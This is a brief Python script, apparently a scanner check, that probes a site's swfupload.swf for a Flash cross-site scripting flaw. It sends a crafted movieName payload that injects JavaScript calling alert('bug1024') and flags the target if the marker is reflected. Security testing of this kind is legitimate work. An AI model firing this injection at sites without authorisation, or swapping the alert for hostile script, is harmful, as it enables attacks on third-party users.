import requests
from termcolor import cprint


class flash_xss:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/uploads/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(\"bug1024\")}}//"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 and "bug1024" in r.content:
                cprint("target may be flash xss:" + vulnurl,"red")
        except:
            return False